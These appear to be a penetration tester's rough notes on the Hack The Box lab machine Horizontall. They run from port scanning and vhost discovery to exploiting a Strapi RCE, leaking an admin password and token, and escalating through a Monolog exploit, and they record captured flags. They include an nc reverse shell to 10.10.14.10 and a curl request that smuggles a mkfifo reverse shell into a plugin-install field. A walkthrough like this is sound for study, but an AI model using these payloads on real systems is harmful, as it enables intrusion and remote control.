# NMAP
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.14.0 (Ubuntu)

# NIKTO
- nginx 1.14.0/ubuntu

# GOBUSTER
- No directories from seclists directories 2.3 med
- Vhost mode found api-prod.horizontall.htb

# api-prod.horizontall.htb
- Strapi 3.0.0-beta.17.4
	- RCE???
	- 50239 exploitdb, appears functional
/admin
- Email enum from "forgot password" link

/users
- 403, are there auth cookies?

/reviews
- Users "wail", "john", and "doe"

/users-permissions/init
- hasAdmin=true, is this cookie?

# 50239.py
python3 50239.py http://api-prod.horizontall.htb
- admin@horizontall.htb:SuperStrongPassword1
- authenticated JSON Web Token: yJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjMzMDM1NzM5LCJleHAiOjE2MzU2Mjc3Mzl9.vrUAnpNNx_JBhFwnFQR083eg8Xb80BBQSTZ8MolU2XQ 
- Unable to set up reverse shell with
```
nc -e /bin/sh 10.10.14.10 4444
```
- Able to log into admin panel

# Admin Panel
- File uploads - webshell/ reverse shell?


# David Uton's exploit
- Better RCE lol
user.txt:
ab29f8cb74c82505a842a778a59f0c84

https://bittherapy.net/post/strapi-framework-remote-code-execution/

Can't get this to work:
curl -i -s -k -X $'POST' -H $'Host: http://api-prod.horizontall.htb' -H $'Authorization: Bearer yJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjMzMDM1NzM5LCJleHAiOjE2MzU2Mjc3Mzl9.vrUAnpNNx_JBhFwnFQR083eg8Xb80BBQSTZ8MolU2XQ' -H $'Content-Type: application/json' -H $'Origin: http://api-prod.horizontall.htb:80' -H $'Content-Length: 123' -H $'Connection: close' --data $'{\"plugin\":\"documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.10 4444 >/tmp/f)\",\"port\":\"80\"}' $'http://api-prod.horizontall.htb:80/admin/plugins/install'


Add pub key to /opt/strapi/.ssh/authorized_keys

ssh -i -L 8000:127.0.0.1:8000 strapi@horizontall.htb

python3 exploit.py http://localhost:8000 Monolog/RCE1 "whoami"

edc59c5f477d7cd33eb52024e0146eb0
